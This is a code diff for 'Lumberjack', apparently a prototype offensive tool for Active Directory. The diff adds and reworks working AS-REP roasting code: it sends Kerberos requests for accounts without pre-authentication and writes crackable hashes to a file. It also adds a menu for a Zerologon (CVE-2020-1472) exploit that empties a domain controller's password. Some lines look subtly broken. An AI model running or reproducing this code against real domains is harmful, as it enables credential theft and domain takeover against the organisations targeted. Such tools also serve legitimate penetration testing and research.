@@ -2,18 +2,7 @@
 # -*- coding: utf-8 -*-
 try:
 	#module imports
-	import argparse
-	import re
-	import sys
-	import textwrap
-	import ldap3
-	import datetime
-	import json	
-	import socket
-	import hmac
-	import hashlib
-	import struct
-	import time
+	import argparse, re, sys, textwrap, ldap3, datetime, json, socket, hmac, hashlib, struct, time, random
 
 	#other imports
 	from datetime import datetime
@@ -37,7 +26,6 @@ try:
 	from pyasn1.codec.der import decoder, encoder
 	from pyasn1.type.univ import noValue
 	from binascii import hexlify
-	import datetime, random
 	from binascii import hexlify, unhexlify
 	from subprocess import check_call
 except Exception as e:
@@ -101,6 +89,7 @@ class EnumerateAD(object):
 				self.conn.open()
 				self.conn.bind()
 				console.print("[+] Success: Connected to Active Directory through LDAPs", style = "success")
+				console.rule("[bold red]Chapter 2")
 			#Connect through LDAP
 			elif self.ldap:
 				self.server_pool = ServerPool(self.dIP)
@@ -172,6 +161,7 @@ class EnumerateAD(object):
 		
 	#Enumerate Active Directory Users		
 	def enumerateUsers(self):
+		
 		try:			
 			self.status.update("[bold white]Finding Active Directory Users...")
 			sleep(1)
@@ -231,7 +221,13 @@ class EnumerateAD(object):
 		self.status.update("[bold white]Finding Active Directory Groups...")
 		sleep(1)
 		try:
-			attrs = ['distinguishedName', 'cn', 'member']
+			attrs = [
+				"cn",
+				"distinguishedName",
+				"managedBy",
+				"member",
+				"name"
+			]
 			#Search AD Group
 			self.conn.search(search_base=LDAP_BASE_DN, search_filter='(objectCategory=group)',
 					 search_scope=SUBTREE, attributes = attrs, size_limit=0)
@@ -277,17 +273,35 @@ class EnumerateAD(object):
 			console.print ("[-] Warning: Aborted", style = "warning")
 			sys.exit(1)
 
+	"""
 	#Enumerate ASREP Roastable Users					
 	def enumKerbPreAuth(self):
 		self.status.update("[bold white]Finding Users that do not require Kerberos Pre-Authentication...")
 		sleep(1)
 		try:	
+			#create array of users
 			self.users = []
 			self.conn.search(search_base=LDAP_BASE_DN, search_filter='(&(samaccounttype=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))', 
 					search_scope=SUBTREE, attributes = ALL_ATTRIBUTES, size_limit=0)
+			console.print ("Show roastable users?[Y/n]")
+			prompt = input()
+			if prompt == "Y":
+				pprint(self.conn.entries)
+				try:
+					console.print ("[-] Enumerate accounts trusted for delegation? [Y/n]", style = "status")
+					prompt2 = input("")
+					if prompt2 == "Y":
+						EnumerateAD.unconstrainedDelegation(self)
+					else:
+						pass
+				except KeyboardInterrupt:
+					self.conn.unbind()
+					console.print ("[-] Warning: Aborted", style = "warning")
+					sys.exit(1)
+			elif prompt == "n":
+				pass
 			for self.entry in self.conn.entries:
 				self.users.append(str(self.entry['sAMAccountName']) + '@{0}'.format(self.dc))
-			console.print('[-] Found {0} accounts that does not require Kerberos preauthentication'.format(len(self.conn.entries)), style = "info")
 			if len(self.users) == 0:
 				console.print('[-] Found {0} accounts that does not require Kerberos preauthentication'.format(len(self.users)), style = "info")
 			elif len(self.users) >= 1:
@@ -296,63 +310,110 @@ class EnumerateAD(object):
 			console.print ("[-] Warning: No ASREP Roastable users found", style = "warning")
 			pprint ("[-] Error: {}".format(e))
 			sys.exit(1)  	
+	"""
 
+	def enumKerbPreAuth(self):
+		self.status.update("[bold white]Finding Users that do not require Kerberos Pre-Authentication...")
+		sleep(1)
+		try:	
+			#create array of users
+			self.users = []
+			self.conn.search(search_base=LDAP_BASE_DN, search_filter='(&(samaccounttype=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))', 
+					search_scope=SUBTREE, attributes = ALL_ATTRIBUTES, size_limit=0)
+			console.print ("Show roastable users?[Y/n]")
+			prompt = input()
+			if prompt == "Y":
+				pprint(self.conn.entries)
+				try:
+					console.print ("[-] Enumerate accounts trusted for delegation? [Y/n]", style = "status")
+					prompt2 = input("")
+					if prompt2 == "Y":
+						EnumerateAD.unconstrainedDelegation(self)
+					else:
+						pass
+				except KeyboardInterrupt:
+					self.conn.unbind()
+					console.print ("[-] Warning: Aborted", style = "warning")
+					sys.exit(1)
+			elif prompt == "n":
+				pass
+			for self.entry in self.conn.entries:
+				self.users.append(str(self.entry['sAMAccountName']) + '@{0}'.format(self.dc))
+			if len(self.users) == 0:
+				console.print('[-] Found {0} accounts that does not require Kerberos preauthentication'.format(len(self.users)), style = "info")
+			elif len(self.users) >= 1:
+				console.print('[-] Found {0} accounts that does not require Kerberos preauthentication'.format(len(self.users)), style = "info")
+		except LDAPException as e:   
+			console.print ("[-] Warning: No ASREP Roastable users found", style = "warning")
+			pprint ("[-] Error: {}".format(e))
+			sys.exit(1) 
+		try:
+			console.print ("[-] Enumerate accounts trusted for delegation? [Y/n]", style = "status")
+			prompt2 = input("")
+			if prompt2 == "Y":
+				EnumerateAD.unconstrainedDelegation(self)
+			else:
+				pass
+		except KeyboardInterrupt:
+			self.conn.unbind()
+			console.print ("[-] Warning: Aborted", style = "warning")
+			sys.exit(1)
 		self.hashes = []
-        # Build request for Tickets
+		# Build request for Tickets
 		for usr in self.users:
-			clientName = Principal(usr, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-			asReq = AS_REQ()
-			domain = str(self.dc).upper()
-			serverName = Principal('krbtgt/{0}'.format(domain), type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-			pacReq = KERB_PA_PAC_REQUEST()
-			pacReq['include-pac'] = True
-			encodedPacReq = encoder.encode(pacReq)
-			asReq['pvno'] = 5
-			asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
-			asReq['padata'] = noValue
-			asReq['padata'][0] = noValue
-			asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
-			asReq['padata'][0]['padata-value'] = encodedPacReq
+			self.clientName = Principal(usr, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+			self.asReq = AS_REQ()
+			self.domain = str(self.dc).upper()
+			self.serverName = Principal('krbtgt/{0}'.format(self.domain), type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+			self.pacReq = KERB_PA_PAC_REQUEST()
+			self.pacReq['include-pac'] = True
+			self.encodedPacReq = encoder.encode(self.pacReq)
+			self.asReq['pvno'] = 5
+			self.asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
+			self.asReq['padata'] = noValue
+			self.asReq['padata'][0] = noValue
+			self.asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
+			self.asReq['padata'][0]['padata-value'] = self.encodedPacReq
 
-			requestBody = seq_set(asReq, 'req-body')
+			self.requestBody = seq_set(self.asReq, 'req-body')
 
-			options = list()
-			options.append(constants.KDCOptions.forwardable.value)
-			options.append(constants.KDCOptions.renewable.value)
-			options.append(constants.KDCOptions.proxiable.value)
-			requestBody['kdc-options'] = constants.encodeFlags(options)
+			self.options = list()
+			self.options.append(constants.KDCOptions.forwardable.value)
+			self.options.append(constants.KDCOptions.renewable.value)
+			self.options.append(constants.KDCOptions.proxiable.value)
+			self.requestBody['kdc-options'] = constants.encodeFlags(self.options)
 
-			seq_set(requestBody, 'sname', serverName.components_to_asn1)
-			seq_set(requestBody, 'cname', clientName.components_to_asn1)
+			self.seq_set(self.requestBody, 'sname', self.serverName.components_to_asn1)
+			self.seq_set(self.requestBody, 'cname', self.clientName.components_to_asn1)
 
-			requestBody['realm'] = domain
+			self.requestBody['realm'] = self.domain
 
-			now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
-			requestBody['till'] = KerberosTime.to_asn1(now)
-			requestBody['rtime'] = KerberosTime.to_asn1(now)
-			requestBody['nonce'] = random.getrandbits(31)
+			self.now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
+			self.requestBody['till'] = KerberosTime.to_asn1(self.now)
+			self.requestBody['rtime'] = KerberosTime.to_asn1(self.now)
+			self.requestBody['nonce'] = random.getrandbits(31)
 
-			supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)
+			self.supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)
 
-			seq_set_iter(requestBody, 'etype', supportedCiphers)
+			self.seq_set_iter(self.requestBody, 'etype', self.supportedCiphers)
 
-			msg = encoder.encode(asReq)
+			self.msg = encoder.encode(self.asReq)
 
 			try:
-				response = sendReceive(msg, domain, self.dc)
+				self.response = sendReceive(self.msg, self.domain, self.dc)
 			except KerberosError as e:
 				if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
-					supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value), int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
-					seq_set_iter(requestBody, 'etype', supportedCiphers)
-					msg = encoder.encode(asReq)
-					response = sendReceive(msg, domain, self.dc)
+					self.supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value), int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
+					self.seq_set_iter(self.requestBody, 'etype', self.supportedCiphers)
+					self.msg = encoder.encode(self.asReq)
+					self.response = sendReceive(self.msg, self.domain, self.dc)
 				else:
 					print(e)
 					continue
 
-			asRep = decoder.decode(response, asn1Spec=AS_REP())[0]
+			self.asRep = decoder.decode(self.response, asn1Spec=AS_REP())[0]
 
-			self.hashes.append('$krb5asrep${0}@{1}:{2}${3}'.format(usr, domain, hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(), hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode()))
+			self.hashes.append('$krb5asrep${0}@{1}:{2}${3}'.format(usr, self.domain, hexlify(self.asRep['enc-part']['cipher'].asOctets()[:16]).decode(), hexlify(self.asRep['enc-part']['cipher'].asOctets()[16:]).decode()))
 
 		if len(self.hashes) > 0:
 			with open('{0}-jtr-hashes'.format(self.dc), 'w') as f:
@@ -361,7 +422,7 @@ class EnumerateAD(object):
 
 			print('[ ' + colored('OK', 'yellow') +' ] Wrote all hashes to {0}-jtr-hashes'.format(self.dc))
 		else:
-			print('[ ' + colored('OK', 'green') +' ] Got 0 hashes')
+			print('[ ' + colored('OK', 'green') +' ] Got 0 hashes') 	
 
 	#Enumerate accounts trusted for delegation (unconstrained delegation)					
 	def unconstrainedDelegation(self):
@@ -375,7 +436,15 @@ class EnumerateAD(object):
 		except LDAPException as e:   
 			console.print ("[-] Warning: No affected users found", style = "warning")
 			pprint ("[-] Error: {}".format(e))
-			sys.exit(1)  	  	
+			sys.exit(1)  
+		try:
+			console.print ("[-] Enumerate SPNs?", style = "status")
+			input("")
+			EnumerateAD.enumSPNs(self)
+		except KeyboardInterrupt:
+			self.conn.unbind()
+			console.print ("[-] Warning: Aborted", style = "warning")
+			sys.exit(1)	  	
 	
 	#Enumerate SPNs
 	def enumSPNs(self):
@@ -420,6 +489,81 @@ class EnumerateAD(object):
 			pprint ("[-] Error: {}".format(e))
 			sys.exit(1)  
 
+
+"""
+class asrepRoast(EnumerateAD):
+
+	def __init__(self, )
+
+	def exploit(self):
+		self.enumKerbPreAuth()
+		self.hashes = []
+		# Build request for Tickets
+		for usr in self.users:
+			self.clientName = Principal(usr, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+			self.asReq = AS_REQ()
+			self.domain = str(self.dc).upper()
+			self.serverName = Principal('krbtgt/{0}'.format(self.domain), type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+			self.pacReq = KERB_PA_PAC_REQUEST()
+			self.pacReq['include-pac'] = True
+			self.encodedPacReq = encoder.encode(self.pacReq)
+			self.asReq['pvno'] = 5
+			self.asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
+			self.asReq['padata'] = noValue
+			self.asReq['padata'][0] = noValue
+			self.asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
+			self.asReq['padata'][0]['padata-value'] = self.encodedPacReq
+
+			self.requestBody = seq_set(self.asReq, 'req-body')
+
+			self.options = list()
+			self.options.append(constants.KDCOptions.forwardable.value)
+			self.options.append(constants.KDCOptions.renewable.value)
+			self.options.append(constants.KDCOptions.proxiable.value)
+			self.requestBody['kdc-options'] = constants.encodeFlags(self.options)
+
+			self.seq_set(self.requestBody, 'sname', self.serverName.components_to_asn1)
+			self.seq_set(self.requestBody, 'cname', self.clientName.components_to_asn1)
+
+			self.requestBody['realm'] = self.domain
+
+			self.now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
+			self.requestBody['till'] = KerberosTime.to_asn1(self.now)
+			self.requestBody['rtime'] = KerberosTime.to_asn1(self.now)
+			self.requestBody['nonce'] = random.getrandbits(31)
+
+			self.supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)
+
+			self.seq_set_iter(self.requestBody, 'etype', self.supportedCiphers)
+
+			self.msg = encoder.encode(self.asReq)
+
+			try:
+				self.response = sendReceive(self.msg, self.domain, self.dc)
+			except KerberosError as e:
+				if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
+					self.supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value), int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
+					self.seq_set_iter(self.requestBody, 'etype', self.supportedCiphers)
+					self.msg = encoder.encode(self.asReq)
+					self.response = sendReceive(self.msg, self.domain, self.dc)
+				else:
+					print(e)
+					continue
+
+			self.asRep = decoder.decode(self.response, asn1Spec=AS_REP())[0]
+
+			self.hashes.append('$krb5asrep${0}@{1}:{2}${3}'.format(usr, self.domain, hexlify(self.asRep['enc-part']['cipher'].asOctets()[:16]).decode(), hexlify(self.asRep['enc-part']['cipher'].asOctets()[16:]).decode()))
+
+		if len(self.hashes) > 0:
+			with open('{0}-jtr-hashes'.format(self.dc), 'w') as f:
+				for h in self.hashes:
+					f.write(str(h) + '\n')
+
+			print('[ ' + colored('OK', 'yellow') +' ] Wrote all hashes to {0}-jtr-hashes'.format(self.dc))
+		else:
+			print('[ ' + colored('OK', 'green') +' ] Got 0 hashes')
+"""
+	
 #Script to exploit CVE-2020-1472 vulnerability in Active Directory
 #Original script and research by Secura (Tom Tervoort) - https://www.secura.com/blog/zero-logon			
 class zerologonExploit(object):
@@ -498,6 +642,7 @@ class zerologonExploit(object):
 			console.print ("[-] Do you want to continue and exploit the Zerologon vulnerability? [N]/y", style = "status")
 			self.exec_exploit = input().lower()
 			if self.exec_exploit == "y":
+				self.status.update("[bold white]Exploiting...")
 				result = self.zeroL.try_zerologon(self, dc_handle, self.rpc_con, target_computer)
 				if result["ErrorCode"] == 0:
 					console.print ("[+] Success: Zerologon Exploit completed! DC's account password has been set to an empty string. ", 
@@ -518,15 +663,15 @@ def titleArt():
 def main():
 
 	parser = argparse.ArgumentParser(prog='Lumberjack', add_help=False, formatter_class=argparse.RawDescriptionHelpFormatter, description=textwrap.dedent('''
-			    __                    __              _            __
-			   / /   __  ______ ___  / /_  ___  _____(_)___ ______/ /__
-			  / /   / / / / __ `__ \/ __ \/ _ \/ ___/ / __ `/ ___/ //_/
-			 / /___/ /_/ / / / / / / /_/ /  __/ /  / / /_/ / /__/  ,<
-			/_____/\__,_/_/ /_/ /_/_.___/\___/_/__/ /\__,_/\___/_/|_|
-			                                   /___/
-	                  __.                                   By Tom Gardner
-	         ________/o |)
-	        {_______{_rs|
+						__                    __              _            __
+					   / /   __  ______ ___  / /_  ___  _____(_)___ ______/ /__
+					  / /   / / / / __ `__ \/ __ \/ _ \/ ___/ / __ `/ ___/ //_/
+					 / /___/ /_/ / / / / / / /_/ /  __/ /  / / /_/ / /__/  ,<
+					/_____/\__,_/_/ /_/ /_/_.___/\___/_/__/ /\__,_/\___/_/|_|
+												       /___/
+	                       __.                                   			By Tom Gardner
+	              ________/o |)
+	             {_______{_rs|
 	        
        A Prototype Active Directory Vulnerability Identification, Exploitation, & Reporting Tool
     |*------------------------------------------------------------------------------------------*|
@@ -595,7 +740,17 @@ def main():
 		elif args.fuzz is not False:
 			enumAD.searchRandom(args.fuzz)
 		elif args.exploit and args.enumObj is False:
-			zeroLogon.__init__()
+			console.print ("Choose a vulnerability to exploit", style="info")
+			prompt = input() 
+			console.print(r"""
+			[+] Options:
+					1. AS-REP Roasting
+					2. Zerologon (CVE-2020-1472)
+
+					(use number)
+			""", style="info")
+			if prompt == "2":
+				zeroLogon.__init__()
 		else:
 			sys.exit(1)
 
